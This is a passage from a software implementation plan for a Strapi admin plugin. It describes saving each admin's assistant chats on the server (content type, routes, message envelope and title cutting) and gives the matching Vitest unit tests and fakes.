Expected: FAIL, among others: `a turn > shows the error in a red alert, takes the failed question back into the box, and clears the error on the next send`; `a turn > shows the words "New chat" on the button when the chat is too long to go on, and starts over when it is pressed`.

In `AskTab.tsx`, never offer New chat: `newChatOffered={false}`.

Run: `npm test -- test/unit/ask-tab.test.tsx`
Expected: FAIL, among others: `a turn > shows the words "New chat" on the button when the chat is too long to go on, and starts over when it is pressed`.

In `AskTab.tsx`, do not put the focus back: delete `box.current?.focus();`.

Run: `npm test -- test/unit/ask-tab.test.tsx`
Expected: FAIL, among others: `a turn > puts the focus back in the text box after a send, from a starter and from the Send button alike, so the next question can be typed`.

In `AskTab.tsx`, empty the draft when the tab goes: add `React.useEffect(() => () => assistant?.setDraft(''), []);` under the line `const box = ...`.

Run: `npm test -- test/unit/ask-tab.test.tsx`
Expected: FAIL, among others: `a turn > keeps the chat and what staff typed while they look at another tab, and shows both when they come back`.

- [ ] **Step 8: Commit**

From `/Users/paul/work/maison-demo`:

```bash
git add strapi/src/plugins/maison/admin/src/components/assistant/AskTab.tsx strapi/src/plugins/maison/admin/src/components/assistant/Composer.tsx strapi/src/plugins/maison/admin/src/components/assistant/ErrorBox.tsx strapi/src/plugins/maison/admin/src/components/assistant/SetupNotice.tsx strapi/src/plugins/maison/test/unit/ask-tab.test.tsx strapi/src/plugins/maison/test/unit/composer.test.tsx strapi/src/plugins/maison/test/unit/setup-notice.test.tsx
git commit -m "maison: the Ask tab's composer, error box and set-up notice" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>" -- strapi/src/plugins/maison/admin/src/components/assistant/AskTab.tsx strapi/src/plugins/maison/admin/src/components/assistant/Composer.tsx strapi/src/plugins/maison/admin/src/components/assistant/ErrorBox.tsx strapi/src/plugins/maison/admin/src/components/assistant/SetupNotice.tsx strapi/src/plugins/maison/test/unit/ask-tab.test.tsx strapi/src/plugins/maison/test/unit/composer.test.tsx strapi/src/plugins/maison/test/unit/setup-notice.test.tsx
```


---

### Task 6: Saved chats on the server: the content type, the five routes, and Reset demo activity

**Group:** Step 1c. After this task the server keeps each admin's chats, and Reset demo activity clears them. Nothing in the admin uses them yet: Task 7 does.

Read first: the spec's rebuild section ("Saved chats", "Server changes", "Tests"); the map's section 4.2; R/`server/src/controllers/conversation.ts`, R/`server/src/lib/admin-ownership.ts`, R/`server/src/lib/stored-messages.ts` and R/`server/src/content-types/conversation/schema.json`. Code: `server/src/content-types/question/schema.json` (a content type that is hidden from the Content Manager), `server/src/services/seed.ts` (`resetDemoAppointments` and `deleteEveryInquiry`), `server/src/routes/index.ts`, `server/src/domain/service-result.ts`, `server/src/controllers/assistant.ts` (how a controller reads the signed-in admin), `test/unit/fake-strapi.ts`, `test/unit/fake-filters.ts`, `test/integration/harness.mjs` and `test/integration/seed.test.mjs`.

**Files:**
- Create: `server/src/content-types/conversation/schema.json`, `server/src/content-types/conversation/index.ts`, `server/src/assistant/stored-messages.ts`, `server/src/services/conversations.ts`, `server/src/controllers/conversations.ts`
- Modify: `server/src/constants.ts`, `server/src/content-types/index.ts`, `server/src/services/index.ts`, `server/src/controllers/index.ts`, `server/src/routes/index.ts`, `server/src/services/seed.ts`
- Test: create `test/unit/conversation-schema.test.ts`, `test/unit/assistant-stored-messages.test.ts`, `test/unit/assistant-conversations.test.ts`, `test/unit/fake-conversations.ts`, `test/integration/assistant-conversations.test.mjs`; modify `test/unit/constants.test.ts`, `test/unit/admin-routes.test.ts`, `test/unit/seed.test.ts`

**Interfaces:**
- Consumes (built): `failure`, `ServiceResult`, `ServiceFailure` (`server/src/domain/service-result.ts`); `ACTION.assistantUse` and the `allow` helper in `server/src/routes/index.ts`; `UID`; the Document Service. Tests only: `fakeStrapi` and `matches`, the fakes of the unit tests.
- Produces:
  ```ts
  // server/src/constants.ts
  UID.conversation = 'plugin::maison.conversation';
  export const SAVED_CHATS: { listRows: 100; titleChars: 80 };
  // server/src/assistant/stored-messages.ts: what a saved chat's `messages` field holds, and the checks on it
  export const STORAGE_VERSION = 1;
  export type StoredMessages = { v: 1; messages: Array<{ id: string; role: 'user' | 'assistant' | 'system'; parts: object[] }> };   // every object keeps every key it has
  export const toStoredMessages: (messages: unknown) => { ok: boolean; value?: StoredMessages; error?: string };
  export const readStoredMessages: (stored: unknown) => { messages: StoredMessages['messages']; error?: string };   // total: never throws
  // server/src/services/conversations.ts
  export const cutTitle: (title: unknown) => string;     // one line, at most 80 characters (not UTF-16 units), "New chat" for none
  export interface SavedChatRow { documentId: string; title: string; updatedAt: string }
  // the service, with the admin's id first in every call
  list(adminId: number): Promise<SavedChatRow[]>;                                                    // newest first, at most 100
  view(adminId: number, documentId: string): Promise<ServiceResult<SavedChatRow & { createdAt: string; messages: StoredMessages['messages'] }>>;
  create(adminId: number, input: { title?: unknown; messages?: unknown }): Promise<ServiceResult<SavedChatRow>>;
  update(adminId: number, documentId: string, input: { title?: unknown; messages?: unknown }): Promise<ServiceResult<SavedChatRow>>;
  remove(adminId: number, documentId: string): Promise<ServiceResult<{ documentId: string }>>;
  ```
  The five admin routes, all with `allow(ACTION.assistantUse)`, as the page (Task 7) calls them under `/maison`:

  | Route | Body | Answer |
  | --- | --- | --- |
  | `GET /conversations` | | `{ conversations: [{ documentId, title, updatedAt }] }` |
  | `GET /conversations/:documentId` | | `{ conversation: { documentId, title, updatedAt, createdAt, messages } }` |
  | `POST /conversations` | `{ title, messages }` | 201, `{ conversation: { documentId, title, updatedAt } }` |
  | `PUT /conversations/:documentId` | `{ title?, messages? }` | `{ conversation: { documentId, title, updatedAt } }` |
  | `DELETE /conversations/:documentId` | | `{ documentId }` |

  Errors: 404 with the message "There is no saved chat with that ID." and `details.code` `not_found` for a chat that is not the admin's or is not there, and 400 with "This chat could not be saved." and `details.code` `invalid_input` for a body that is not a chat.
- Decisions made here: a chat that belongs to another admin is answered exactly as one that does not exist, so the answer never confirms it is there; the admin is the one signed in and never a field of the body. The `messages` field is JSON, so Strapi would store anything: the service stores `{ v: 1, messages }` after a zod check in which every part is a loose object, so every key of every part is kept. That differs from the reference, whose server sends the model text only: Maison sends the whole history back to the model each turn, and Anthropic refuses a history whose signed thinking block was changed. Reading is total: a stored value that cannot be read opens as an empty chat, the log names the chat (never its content), and the stored value is left as it is. The title is a `text` attribute, cut to 80 characters in code: the spec allows no `string` attribute over 255, and a `text` attribute has no length to outgrow. Saves are not capped by Maison: Strapi's 1 MB body limit is the cap, and a save past it fails like any failed save. Reset demo activity deletes every admin's chats after the demo activity, in batches like the inquiries, and its answer does not count them (the Demo data block's text stays as it is).

**Review Focus covered here:**
- 2. Another admin's chat, or a chat that is gone. Pinned in `assistant-conversations.test.ts` by `view > says there is no such chat for another admin's chat, in the same words as for an ID nobody has`, `update > writes nothing for another admin's chat, or an ID nobody has, and says there is no such chat`, `remove > deletes nothing of another admin's chat, and says there is no such chat`, `list > is the admin's own chats only, ...` and the controller's `another admin's chat > is a 404 for %s, ...`; and on a real Strapi by `keeps one admin's chat from another: it is not in their list, and opening, saving and deleting it answer 404, as an ID nobody has does`.
- 4. A stored chat that cannot be read, and thinking signatures kept. Pinned by `toStoredMessages > keeps every key of every part: ...`, `readStoredMessages > gives no messages and an error, and never throws, for %s` and `view > opens a chat whose stored messages cannot be read as an empty chat, and logs which one, without its content`; and on a real Strapi by `saves a chat, lists it and opens it, and every key of every part comes back as it was saved` and `opens a chat whose stored messages cannot be read as an empty chat, and leaves the stored value alone`.
- 5. A title of Japanese text or emoji cut at 80 characters without splitting a character. Pinned by `cutTitle > counts characters, not UTF-16 units: a Japanese title and an emoji are never split`, and on a real Strapi by `cuts a long title to 80 characters, and never splits an emoji or a Japanese character`.

- [ ] **Step 1: Write the failing tests**

Six unit test files, a helper for them, and one integration test file. `fake-conversations.ts` is the Document Service as a small table for the conversation content type (it stamps `updatedAt` with a clock that moves one second a call, so "newest first" is a real order), a Koa context with Strapi's error helpers, and the service and controller wired over them. `assistant-conversations.test.ts` tests `cutTitle`, the service, the controller and the five routes. The integration test runs the real controller on a real Strapi with a real database.

`test/unit/constants.test.ts`:

```diff
@@
   PLUGIN_ID,
   QUESTION_REASONS,
   QUESTION_STATUSES,
+  SAVED_CHATS,
   SENTIMENT_LABELS,
   TOOL_NAMES,
   UID,
@@
       draftChars: 2000,
     });
   });
+
+  it('declares the saved chats: the content type, and how many the sidebar lists and how long a title is', () => {
+    expect(UID.conversation).toBe('plugin::maison.conversation');
+    expect(SAVED_CHATS).toEqual({ listRows: 100, titleChars: 80 });
+  });
 });
```

Create `test/unit/conversation-schema.test.ts`:

```ts
import { describe, expect, it } from 'vitest';
import contentTypes from '../../server/src/content-types';
import schema from '../../server/src/content-types/conversation/schema.json';
import { UID } from '../../server/src/constants';

describe('the saved chat content type', () => {
  it('is registered as plugin::maison.conversation, in the table maison_conversations', () => {
    expect(contentTypes.conversation.schema).toBe(schema);
    expect(UID.conversation).toBe(`plugin::maison.${schema.info.singularName}`);
    expect(schema.collectionName).toBe('maison_conversations');
  });

  it('has a title, the messages and the admin it belongs to, and the last two are required', () => {
    expect(Object.keys(schema.attributes).sort()).toEqual(['adminUserId', 'messages', 'title']);
    expect(schema.attributes.title.type).toBe('text');
    expect(schema.attributes.messages).toEqual({ type: 'json', required: true });
    expect(schema.attributes.adminUserId).toEqual({ type: 'integer', required: true });
  });

  // A title is cut to 80 characters in code, and a text column has no width of its own to outgrow: a string would be varchar(255) on Strapi Cloud.
  it('keeps the title in a text attribute, with no maxLength to outgrow', () => {
    expect(schema.attributes.title).not.toHaveProperty('maxLength');
  });

  it('has no draft and publish: a saved chat is saved as it is', () => {
    expect(schema.options.draftAndPublish).toBe(false);
  });

  it('is hidden from the Content Manager and the Content-Type Builder: only its admin reads a chat, on the Ask tab', () => {
    expect(schema.pluginOptions['content-manager'].visible).toBe(false);
    expect(schema.pluginOptions['content-type-builder'].visible).toBe(false);
  });
});
```

Create `test/unit/assistant-stored-messages.test.ts`:

```ts
import { describe, expect, it } from 'vitest';
import { STORAGE_VERSION, readStoredMessages, toStoredMessages } from '../../server/src/assistant/stored-messages';

type Doc = Record<string, any>;

const message = (parts: Doc[], fields: Doc = {}) => ({ id: 'm1', role: 'assistant', parts, ...fields });
const text = (content: string): Doc => ({ type: 'text', content });

describe('toStoredMessages', () => {
  it('wraps the messages in a versioned envelope', () => {
    const messages = [{ id: 'u1', role: 'user', parts: [text('Which visits are waiting?')] }, message([text('Two visits wait.')])];
    expect(toStoredMessages(messages)).toEqual({ ok: true, value: { v: 1, messages } });
    expect(STORAGE_VERSION).toBe(1);
  });

  it('keeps every key of every part: a thinking part with its signature, a tool call with its output, and the keys of a message', () => {
    const messages = [
      message(
        [
          { type: 'thinking', content: 'Let me look.', signature: 'EqQBCkYIBRgC', providerMetadata: { anthropic: { index: 0 } } },
          text('Looking.'),
          { type: 'tool-call', id: 'c1', name: 'list_requests', arguments: '{}', state: 'complete', input: {}, output: { requests: [], capped: false }, approval: { id: 'x' } },
          { type: 'tool-result', toolCallId: 'c1', content: '{"requests":[]}', state: 'complete', extra: [1, 2] },
        ],
        { createdAt: '2026-10-07T00:00:00.000Z', metadata: { tanstack: { model: 'claude-sonnet-5-5' } } }
      ),
    ];
    const stored = toStoredMessages(messages);
    expect(stored.ok).toBe(true);
    expect(stored.value?.messages).toEqual(messages);
  });

  it('keeps a part of a type it does not know, as it is, instead of refusing the chat', () => {
    const messages = [message([{ type: 'structured-output', status: 'complete', raw: '{}', data: { a: 1 } }, text('Done.')])];
    expect(toStoredMessages(messages).value?.messages).toEqual(messages);
  });

  it('accepts no messages: a chat saved before its first answer', () => {
    expect(toStoredMessages([])).toEqual({ ok: true, value: { v: 1, messages: [] } });
  });

  it.each([
    ['messages that are not a list', 'hello'],
    ['no messages at all', undefined],
    ['null', null],
    ['an object', { v: 1, messages: [] }],
    ['a message with no id', [{ role: 'user', parts: [] }]],
    ['a message with an empty id', [{ id: '', role: 'user', parts: [] }]],
    ['a message with a role that is not one', [{ id: 'm1', role: 'wizard', parts: [] }]],
    ['a message with no parts list', [{ id: 'm1', role: 'user' }]],
    ['a part with no type', [{ id: 'm1', role: 'user', parts: [{ content: 'x' }] }]],
    ['a part that is not an object', [{ id: 'm1', role: 'user', parts: ['x'] }]],
    ['a message that is not an object', ['x']],
  ])('refuses %s, and says where', (_what, input) => {
    const stored = toStoredMessages(input);
    expect(stored.ok).toBe(false);
    expect(stored.value).toBeUndefined();
    expect(stored.error).toEqual(expect.any(String));
    expect(stored.error).not.toBe('');
  });

  it('does not change the messages it was given', () => {
    const messages = [message([{ type: 'thinking', content: 'x', signature: 's' }])];
    const before = JSON.stringify(messages);
    toStoredMessages(messages);
    expect(JSON.stringify(messages)).toBe(before);
  });
});

describe('readStoredMessages', () => {
  it('gives back the messages of an envelope, with every key', () => {
    const messages = [message([{ type: 'thinking', content: 'x', signature: 's' }, text('Hi.')])];
    expect(readStoredMessages({ v: 1, messages })).toEqual({ messages });
  });

  it('gives no messages, and no error, for a chat that has none stored', () => {
    expect(readStoredMessages(null)).toEqual({ messages: [] });
    expect(readStoredMessages(undefined)).toEqual({ messages: [] });
  });

  // Reading is total: a damaged chat costs staff that chat, never the page.
  it.each([
    ['text', 'not a chat'],
    ['a number', 42],
    ['a bare list', [message([text('x')])]],
    ['a later version', { v: 2, messages: [] }],
    ['an envelope with a bad message', { v: 1, messages: [{ id: 1 }] }],
    ['an envelope with no messages', { v: 1 }],
  ])('gives no messages and an error, and never throws, for %s', (_what, stored) => {
    const read = readStoredMessages(stored);
    expect(read.messages).toEqual([]);
    expect(read.error).toMatch(/^unrecognised shape: /);
  });
});
```

Create `test/unit/fake-conversations.ts`:

```ts
import { vi } from 'vitest';
import { UID } from '../../server/src/constants';
import conversationsController from '../../server/src/controllers/conversations';
import conversationsService from '../../server/src/services/conversations';
import { matches } from './fake-filters';
import { fakeStrapi } from './fake-strapi';

/*
 * What the tests of the saved chats share: the Document Service as a small table for the conversation content type, a Koa context with
 * Strapi's error helpers, and the service and controller wired over them.
 */

export type Doc = Record<string, any>;

/** A message as the page saves it: TanStack AI's UIMessage. */
export const staffMessage = (id: string, content: string): Doc => ({ id, role: 'user', parts: [{ type: 'text', content }] });
export const assistantMessage = (id: string, content: string): Doc => ({ id, role: 'assistant', parts: [{ type: 'text', content }] });
export const CHAT: Doc[] = [staffMessage('u1', 'Which visits are waiting?'), assistantMessage('a1', 'Two visits wait.')];

/**
 * The conversation rows, as the database holds them, and the Document Service over them. A create or an update stamps `updatedAt` with a
 * clock that moves one second each time, so "newest first" is a real order. It keeps every call, by method.
 */
export const fakeTable = (initial: Doc[] = []) => {
  const rows = new Map<string, Doc>(initial.map((row) => [row.documentId, row]));
  let clock = Date.parse('2026-10-07T00:00:00.000Z');
  let nextId = 1;
  const stamp = () => new Date((clock += 1000)).toISOString();
  const calls: Array<{ method: string; params: Doc }> = [];

  const documents = (uid: string) => {
    if (uid !== UID.conversation) throw new Error(`These tests only hold the conversation content type, not ${uid}.`);
    const record = <T>(method: string, params: Doc, answer: T): T => {
      calls.push({ method, params });
      return answer;
    };
    return {
      findMany: async (params: Doc) => {
        const found = [...rows.values()].filter((row) => matches(row, params.filters));
        // Newest first when sorted on updatedAt desc, which is the only sort the service asks for.
        if (JSON.stringify(params.sort) === JSON.stringify({ updatedAt: 'desc' })) found.sort((a, b) => b.updatedAt.localeCompare(a.updatedAt));
        else if (params.sort !== undefined) throw new Error(`These tests don't know the sort ${JSON.stringify(params.sort)}.`);
        const limited = found.slice(0, params.limit ?? found.length);
        // With `fields`, a row holds those and the ones Strapi always gives.
        const keep = params.fields ? ['id', 'documentId', ...params.fields] : null;
        return record('findMany', params, limited.map((row) => (keep ? Object.fromEntries(Object.entries(row).filter(([key]) => keep.includes(key))) : { ...row })));
      },
      findOne: async (params: Doc) => record('findOne', params, rows.get(params.documentId) ? { ...rows.get(params.documentId) } : null),
      create: async ({ data }: Doc) => {
        const at = stamp();
        const row = { id: nextId, documentId: `chat-${nextId}`, ...data, createdAt: at, updatedAt: at };
        nextId += 1;
        rows.set(row.documentId, row);
        return record('create', { data }, { ...row });
      },
      update: async ({ documentId, data }: Doc) => {
        const row = { ...rows.get(documentId), ...data, updatedAt: stamp() };
        rows.set(documentId, row);
        return record('update', { documentId, data }, { ...row });
      },
      delete: async ({ documentId }: Doc) => {
        rows.delete(documentId);
        return record('delete', { documentId }, { documentId, entries: [] });
      },
    };
  };

  return { rows, documents, calls, called: (method: string) => calls.filter((call) => call.method === method) };
};

/** A row as the database holds a saved chat of an admin. */
export const savedRow = (documentId: string, adminUserId: number, fields: Doc = {}): Doc => ({
  id: Number(documentId.replace(/\D/g, '') || 0),
  documentId,
  title: 'Which visits are waiting?',
  messages: { v: 1, messages: CHAT },
  adminUserId,
  createdAt: '2026-10-06T00:00:00.000Z',
  updatedAt: '2026-10-06T00:00:00.000Z',
  ...fields,
});

/** Strapi's error helpers on a Koa context, and the status each one sets. */
const ERROR_HELPERS = { badRequest: 400, unauthorized: 401, notFound: 404 };

/** Enough of a Koa context for the saved chats' controller: the signed-in admin, the route's params and body, and Strapi's error helpers. */
export const fakeCtx = ({ admin = 7, params = {}, body }: { admin?: number | null; params?: Doc; body?: unknown } = {}) => {
  const ctx: Doc = { state: admin === null ? {} : { user: { id: admin } }, params, request: { body }, status: 200, body: undefined };
  for (const [helper, status] of Object.entries(ERROR_HELPERS)) {
    ctx[helper] = vi.fn((message?: string, details?: unknown) => {
      ctx.status = status;
      ctx.body = { error: { message, details } };
    });
  }
  return ctx;
};

/** The saved chats' service and controller over a table of rows. */
export const chatsWorld = (initial: Doc[] = []) => {
  const table = fakeTable(initial);
  const services: Doc = {};
  const strapi = fakeStrapi({ services, documents: table.documents as never });
  services.conversations = conversationsService({ strapi });
  const controller = conversationsController({ strapi });
  return { ...table, strapi, controller, service: services.conversations as ReturnType<typeof conversationsService> };
};
```

Create `test/unit/assistant-conversations.test.ts`:

```ts
import { describe, expect, it, vi } from 'vitest';
import { ACTION, SAVED_CHATS, UID } from '../../server/src/constants';
import controllers from '../../server/src/controllers';
import routes from '../../server/src/routes';
import { cutTitle } from '../../server/src/services/conversations';
import { CHAT, assistantMessage, chatsWorld, fakeCtx, savedRow, staffMessage, type Doc } from './fake-conversations';
import { fakeStrapi } from './fake-strapi';

const NO_CHAT = 'There is no saved chat with that ID.';
const NOT_SAVED = 'This chat could not be saved.';

describe('cutTitle', () => {
  it('is the words as they were written, on one line', () => {
    expect(cutTitle('Which visits are waiting?')).toBe('Which visits are waiting?');
    expect(cutTitle('  Which visits\n\nare   waiting?  ')).toBe('Which visits are waiting?');
  });

  it('is cut to 80 characters, and an 80-character title is not cut', () => {
    expect(SAVED_CHATS.titleChars).toBe(80);
    expect(cutTitle('a'.repeat(80))).toBe('a'.repeat(80));
    expect(cutTitle('a'.repeat(81))).toBe('a'.repeat(80));
    expect(Array.from(cutTitle('b'.repeat(500)))).toHaveLength(80);
  });

  it('counts characters, not UTF-16 units: a Japanese title and an emoji are never split', () => {
    const japanese = '今日のお客様からの問い合わせを教えてください。'.repeat(5);
    expect(Array.from(cutTitle(japanese))).toHaveLength(80);
    expect(japanese.startsWith(cutTitle(japanese))).toBe(true);
    const emoji = '😀'.repeat(100);
    expect(cutTitle(emoji)).toBe('😀'.repeat(80));
    expect(cutTitle(emoji)).not.toMatch(/[\uD800-\uDBFF]$/);
  });

  it('is "New chat" for a title that is empty, only spaces, or not text', () => {
    for (const title of ['', '   \n\t ', undefined, null, 42, {}, ['x']]) expect(cutTitle(title), String(title)).toBe('New chat');
  });
});

describe('the saved chats service', () => {
  describe('list', () => {
    it("is the admin's own chats only, with the id, the title and when it was saved: no messages", async () => {
      const { service, called } = chatsWorld([savedRow('c1', 7), savedRow('c2', 8), savedRow('c3', 7, { title: 'Any complaints this week?' })]);
      const chats = await service.list(7);
      expect(chats.map((chat) => chat.documentId).sort()).toEqual(['c1', 'c3']);
      for (const chat of chats) expect(Object.keys(chat).sort()).toEqual(['documentId', 'title', 'updatedAt']);
      expect(called('findMany')[0].params.filters).toEqual({ adminUserId: { $eq: 7 } });
    });

    it('is newest first, by when each was saved last', async () => {
      const { service } = chatsWorld([
        savedRow('old', 7, { updatedAt: '2026-10-01T00:00:00.000Z' }),
        savedRow('new', 7, { updatedAt: '2026-10-05T00:00:00.000Z' }),
        savedRow('mid', 7, { updatedAt: '2026-10-03T00:00:00.000Z' }),
      ]);
      expect((await service.list(7)).map((chat) => chat.documentId)).toEqual(['new', 'mid', 'old']);
    });

    it('is at most 100 chats: the newest ones', async () => {
      const rows = Array.from({ length: 105 }, (_, index) => savedRow(`c${index}`, 7, { updatedAt: new Date(Date.UTC(2026, 9, 1, 0, 0, index)).toISOString() }));
      const { service, called } = chatsWorld(rows);
      const chats = await service.list(7);
      expect(SAVED_CHATS.listRows).toBe(100);
      expect(chats).toHaveLength(100);
      expect(chats[0].documentId).toBe('c104');
      expect(chats[chats.length - 1].documentId).toBe('c5');
      expect(called('findMany')[0].params.limit).toBe(100);
    });

    it('is empty for an admin with no chats', async () => {
      const { service } = chatsWorld([savedRow('c1', 8)]);
      expect(await service.list(7)).toEqual([]);
    });
  });

  describe('view', () => {
    it('opens an own chat with its messages unwrapped, every key as it was saved', async () => {
      const messages = [staffMessage('u1', 'Hi'), { id: 'a1', role: 'assistant', parts: [{ type: 'thinking', content: 'x', signature: 'sig' }, { type: 'text', content: 'Hello.' }] }];
      const { service } = chatsWorld([savedRow('c1', 7, { messages: { v: 1, messages } })]);
      const result = await service.view(7, 'c1');
      expect(result).toMatchObject({ ok: true, value: { documentId: 'c1', title: 'Which visits are waiting?' } });
      expect((result as Doc).value.messages).toEqual(messages);
    });

    it("says there is no such chat for another admin's chat, in the same words as for an ID nobody has", async () => {
      const { service } = chatsWorld([savedRow('c1', 8)]);
      const others = await service.view(7, 'c1');
      const missing = await service.view(7, 'nobody');
      expect(others).toMatchObject({ ok: false, code: 'not_found', message: NO_CHAT });
      expect(missing).toEqual(others);
    });

    it('opens a chat whose stored messages cannot be read as an empty chat, and logs which one, without its content', async () => {
      const { service, strapi } = chatsWorld([savedRow('c1', 7, { messages: { v: 9, secret: 'line:Uabc' } })]);
      const result = await service.view(7, 'c1');
      expect(result).toMatchObject({ ok: true, value: { documentId: 'c1', messages: [] } });
      expect(strapi.log.warn).toHaveBeenCalledOnce();
      expect(strapi.log.warn.mock.calls[0][0]).toContain('c1');
      expect(strapi.log.warn.mock.calls[0][0]).not.toContain('line:Uabc');
    });
  });

  describe('create', () => {
    it('saves the chat for the admin: the envelope, the title, and the admin of the session', async () => {
      const { service, rows } = chatsWorld();
      const result = await service.create(7, { title: 'Which visits are waiting?', messages: CHAT });
      expect(result).toMatchObject({ ok: true, value: { documentId: 'chat-1', title: 'Which visits are waiting?' } });
      expect(rows.get('chat-1')).toMatchObject({ adminUserId: 7, title: 'Which visits are waiting?', messages: { v: 1, messages: CHAT } });
    });

    it('answers the row the sidebar lists, without the messages', async () => {
      const { service } = chatsWorld();
      const result = await service.create(7, { title: 'x', messages: CHAT });
      expect(Object.keys((result as Doc).value).sort()).toEqual(['documentId', 'title', 'updatedAt']);
    });

    it('cuts the title to 80 characters, and gives "New chat" for none', async () => {
      const { service, rows } = chatsWorld();
      await service.create(7, { title: 'x'.repeat(300), messages: CHAT });
      await service.create(7, { messages: CHAT });
      expect(rows.get('chat-1')?.title).toBe('x'.repeat(80));
      expect(rows.get('chat-2')?.title).toBe('New chat');
    });

    it('takes no admin from the input: a chat is always the signed-in admin\'s', async () => {
      const { service, rows } = chatsWorld();
      await service.create(7, { title: 'x', messages: CHAT, adminUserId: 99 } as never);
      expect(rows.get('chat-1')?.adminUserId).toBe(7);
    });

    it('refuses messages that are not in the shape the page keeps, and saves nothing', async () => {
      const { service, called } = chatsWorld();
      for (const messages of [undefined, 'hello', [{ id: 'm1', role: 'wizard', parts: [] }]]) {
        expect(await service.create(7, { title: 'x', messages }), JSON.stringify(messages)).toMatchObject({ ok: false, code: 'invalid_input', message: NOT_SAVED });
      }
      expect(called('create')).toEqual([]);
    });
  });

  describe('update', () => {
    it('saves the messages again, and moves the chat to the top of the list', async () => {
      const { service, rows } = chatsWorld([savedRow('c1', 7, { updatedAt: '2026-10-01T00:00:00.000Z' }), savedRow('c2', 7, { updatedAt: '2026-10-02T00:00:00.000Z' })]);
      const longer = [...CHAT, staffMessage('u2', 'And the questions?'), assistantMessage('a2', 'Three.')];
      const result = await service.update(7, 'c1', { messages: longer });
      expect(result).toMatchObject({ ok: true, value: { documentId: 'c1' } });
      expect(rows.get('c1')?.messages).toEqual({ v: 1, messages: longer });
      expect((await service.list(7)).map((chat) => chat.documentId)).toEqual(['c1', 'c2']);
    });

    it('changes only what it is given: a title alone leaves the messages, and messages alone leave the title', async () => {
      const { service, rows } = chatsWorld([savedRow('c1', 7)]);
      await service.update(7, 'c1', { title: 'A new title' });
      expect(rows.get('c1')).toMatchObject({ title: 'A new title', messages: { v: 1, messages: CHAT } });
      await service.update(7, 'c1', { messages: [staffMessage('u9', 'Other')] });
      expect(rows.get('c1')).toMatchObject({ title: 'A new title', messages: { v: 1, messages: [staffMessage('u9', 'Other')] } });
    });

    it('cuts the title to 80 characters', async () => {
      const { service, rows } = chatsWorld([savedRow('c1', 7)]);
      await service.update(7, 'c1', { title: 'y'.repeat(200) });
      expect(rows.get('c1')?.title).toBe('y'.repeat(80));
    });

    it("writes nothing for another admin's chat, or an ID nobody has, and says there is no such chat", async () => {
      const { service, called, rows } = chatsWorld([savedRow('c1', 8)]);
      expect(await service.update(7, 'c1', { title: 'Mine now' })).toMatchObject({ ok: false, code: 'not_found', message: NO_CHAT });
      expect(await service.update(7, 'nobody', { title: 'x' })).toMatchObject({ ok: false, code: 'not_found', message: NO_CHAT });
      expect(called('update')).toEqual([]);
      expect(rows.get('c1')?.title).toBe('Which visits are waiting?');
    });

    it('refuses messages that are not in the shape the page keeps, and changes nothing, the title included', async () => {
      const { service, called, rows } = chatsWorld([savedRow('c1', 7)]);
      expect(await service.update(7, 'c1', { title: 'New title', messages: 'hello' })).toMatchObject({ ok: false, code: 'invalid_input', message: NOT_SAVED });
      expect(called('update')).toEqual([]);
      expect(rows.get('c1')?.title).toBe('Which visits are waiting?');
    });

    it('takes no admin from the input', async () => {
      const { service, rows } = chatsWorld([savedRow('c1', 7)]);
      await service.update(7, 'c1', { title: 'x', adminUserId: 99 } as never);
      expect(rows.get('c1')?.adminUserId).toBe(7);
    });
  });

  describe('remove', () => {
    it('deletes an own chat', async () => {
      const { service, rows } = chatsWorld([savedRow('c1', 7), savedRow('c2', 7)]);
      expect(await service.remove(7, 'c1')).toEqual({ ok: true, value: { documentId: 'c1' } });
      expect([...rows.keys()]).toEqual(['c2']);
    });

    it("deletes nothing of another admin's chat, and says there is no such chat", async () => {
      const { service, called, rows } = chatsWorld([savedRow('c1', 8)]);
      expect(await service.remove(7, 'c1')).toMatchObject({ ok: false, code: 'not_found', message: NO_CHAT });
      expect(await service.remove(7, 'nobody')).toMatchObject({ ok: false, code: 'not_found' });
      expect(called('delete')).toEqual([]);
      expect(rows.has('c1')).toBe(true);
    });
  });

  it('works on the conversation content type, plugin::maison.conversation', () => {
    expect(UID.conversation).toBe('plugin::maison.conversation');
  });
});

describe('the saved chats controller', () => {
  it('lists the signed-in admin\'s chats as { conversations }', async () => {
    const { controller } = chatsWorld([savedRow('c1', 7), savedRow('c2', 8)]);
    const ctx = fakeCtx({ admin: 7 });
    await controller.list(ctx);
    expect(ctx.body).toEqual({ conversations: [{ documentId: 'c1', title: 'Which visits are waiting?', updatedAt: '2026-10-06T00:00:00.000Z' }] });
  });

  it('opens a chat as { conversation }, with its messages', async () => {
    const { controller } = chatsWorld([savedRow('c1', 7)]);
    const ctx = fakeCtx({ admin: 7, params: { documentId: 'c1' } });
    await controller.findOne(ctx);
    expect(ctx.body.conversation).toMatchObject({ documentId: 'c1', title: 'Which visits are waiting?', messages: CHAT });
  });

  it('saves a new chat with 201, the admin of the session, and the row without its messages', async () => {
    const { controller, rows } = chatsWorld();
    const ctx = fakeCtx({ admin: 7, body: { title: 'Which visits are waiting?', messages: CHAT, adminUserId: 99 } });
    await controller.create(ctx);
    expect(ctx.status).toBe(201);
    expect(ctx.body).toEqual({ conversation: { documentId: 'chat-1', title: 'Which visits are waiting?', updatedAt: expect.any(String) } });
    expect(rows.get('chat-1')?.adminUserId).toBe(7);
  });

  it('saves a chat again with 200', async () => {
    const { controller, rows } = chatsWorld([savedRow('c1', 7)]);
    const ctx = fakeCtx({ admin: 7, params: { documentId: 'c1' }, body: { messages: [...CHAT, staffMessage('u2', 'More')] } });
    await controller.update(ctx);
    expect(ctx.status).toBe(200);
    expect(ctx.body.conversation.documentId).toBe('c1');
    expect(rows.get('c1')?.messages.messages).toHaveLength(3);
  });

  it('deletes a chat and says which', async () => {
    const { controller, rows } = chatsWorld([savedRow('c1', 7)]);
    const ctx = fakeCtx({ admin: 7, params: { documentId: 'c1' } });
    await controller.remove(ctx);
    expect(ctx.body).toEqual({ documentId: 'c1' });
    expect(rows.size).toBe(0);
  });

  describe("another admin's chat", () => {
    const attempt = async (handler: 'findOne' | 'update' | 'remove', params: Doc) => {
      const { controller, rows } = chatsWorld([savedRow('c1', 8)]);
      const ctx = fakeCtx({ admin: 7, params, body: { title: 'x' } });
      await controller[handler](ctx);
      return { ctx, rows };
    };

    it.each(['findOne', 'update', 'remove'] as const)('is a 404 for %s, with the code not_found, and the same answer as for an ID nobody has', async (handler) => {
      const others = await attempt(handler, { documentId: 'c1' });
      const missing = await attempt(handler, { documentId: 'nobody' });
      expect(others.ctx.status).toBe(404);
